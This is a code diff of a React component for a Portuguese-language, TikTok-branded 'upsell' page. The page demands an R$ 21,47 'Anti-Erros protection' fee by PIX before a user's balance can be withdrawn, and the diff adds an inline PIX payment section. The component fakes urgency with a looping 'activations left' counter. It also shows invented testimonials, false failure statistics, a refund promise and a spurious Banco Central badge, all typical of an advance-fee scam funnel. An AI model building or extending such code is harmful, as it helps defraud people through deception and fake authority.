@@ -1,17 +1,20 @@
 import { useState, useEffect } from "react";
 import { Loader2, AlertTriangle, Shield, CheckCircle2, Lock, Zap, ChevronRight } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
+import InlinePixSection from "./InlinePixSection";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
+import { PixPaymentData } from "./types";
 
-interface FunnelUpsellAntiErrosProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
+interface FunnelUpsellAntiErrosProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; pixData?: PixPaymentData | null; onCopyPix?: () => void; isPixCopied?: boolean; onManualCheck?: () => void; isCheckingPayment?: boolean; checkError?: string | null; }
 const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="border border-gray-200 rounded-lg overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-2.5 text-left bg-white"><span className="text-gray-700 text-[11px] font-semibold">{question}</span><span className="text-gray-400 text-xs">{open ? "−" : "+"}</span></button>{open && <p className="px-2.5 pb-2.5 text-gray-500 text-[11px] leading-relaxed">{answer}</p>}</div>); };
 
-const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiErrosProps) => {
+const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError }: FunnelUpsellAntiErrosProps) => {
   const [activationsLeft, setActivationsLeft] = useState(4);
   const firstName = leadName ? leadName.split(" ")[0] : "";
+  const showPixInline = !!pixData?.pix_code;
   useEffect(() => { const interval = setInterval(() => setActivationsLeft(prev => (prev <= 1 ? 5 : prev - 1)), 20000); return () => clearInterval(interval); }, []);
 
   return (
@@ -35,12 +38,16 @@ const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, 
           <p className="text-red-500 text-[10px] font-semibold mb-2">❌ {firstName ? `${firstName}, sem` : "Sem"} proteção = risco de perda total do saldo de {balance}</p>
           <div className="flex items-center justify-center gap-1.5 mt-2.5"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX • Reembolso garantido</span></div>
         </div>
+
+        {showPixInline && pixData && (
+          <InlinePixSection pixData={pixData} amount="R$ 21,47" label="Proteção Anti-Erros" onCopy={onCopyPix} isCopied={isPixCopied} onManualCheck={onManualCheck} isCheckingPayment={isCheckingPayment} checkError={checkError} accentColor="#10b981" />
+        )}
+
         <div className="space-y-2"><p className="text-gray-700 text-xs font-bold">Perguntas frequentes</p><FaqItem question="O que é a proteção Anti-Erros?" answer="É um protocolo de verificação que corrige automaticamente qualquer inconsistência entre seu CPF, chave PIX e dados bancários antes da transferência." /><FaqItem question="Por que 23% dos saques falham sem proteção?" answer="O sistema bancário rejeita transferências quando detecta inconsistência entre os dados cadastrais." /><FaqItem question="A taxa de R$ 21,47 é reembolsável?" answer="Sim, 100% reembolsável. Se o saque não cair na sua conta, o valor retorna automaticamente em até 2 minutos." /></div>
         <div className="bg-gray-50 rounded-xl p-3 border border-gray-200"><p className="text-gray-700 text-xs font-bold mb-2.5 flex items-center gap-1.5"><CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />Protegidos e sacaram com sucesso</p><div className="space-y-2.5">{[{ img: testimonial1, name: "Renata S.", amount: "R$ 2.134", text: "Quase perdi tudo por erro de chave. A proteção corrigiu na hora!" }, { img: testimonial2, name: "Diego M.", amount: "R$ 3.671", text: "Meu CPF tava diferente no banco. Sem a proteção ia perder." }, { img: testimonial3, name: "Juliana F.", amount: "R$ 1.892", text: "Ativei e em 3 min caiu tudo certinho. Vale muito." }].map((t, i) => (<div key={i} className="flex items-center gap-2.5"><img src={t.img} alt="" loading="lazy" className="w-7 h-7 rounded-full object-cover shrink-0" /><div className="flex-1 min-w-0"><div className="flex items-center justify-between"><p className="text-gray-600 text-[11px] font-semibold">{t.name}</p><span className="text-emerald-600 text-[10px] font-bold">{t.amount} ✓</span></div><p className="text-gray-400 text-[10px] truncate">"{t.text}"</p></div></div>))}</div></div>
         <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
-        <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="PROTEGER MEU SAQUE" bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />
+      {!showPixInline && <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="PROTEGER MEU SAQUE" bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />}
     </div>
   );
 };
